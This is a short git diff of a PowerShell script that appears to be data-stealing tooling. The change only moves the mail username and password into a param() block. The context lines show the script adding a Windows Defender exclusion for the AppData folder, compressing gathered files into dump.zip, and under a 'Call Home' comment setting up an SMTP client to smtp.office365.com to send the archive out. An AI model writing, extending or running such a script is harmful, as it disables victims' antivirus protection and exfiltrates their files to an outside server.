@@ -1,3 +1,9 @@
+param(
+    [Parameter()]
+    [String]$Username,
+    [String]$Password
+)
+
 #Adding windows defender exclusionpath
 Add-MpPreference -ExclusionPath "$env:appdata"
 #Creating the directory we will work on
@@ -11,8 +17,6 @@ Compress-Archive -Path * -DestinationPath dump.zip
 $Random = Get-Random
 
 # Call Home
-$UserName = args[0]
-$Password = args[1]
 $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp.office365.com', 587)
 $SMTPInfo.EnableSsl = $true
 $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential($UserName, $Password)
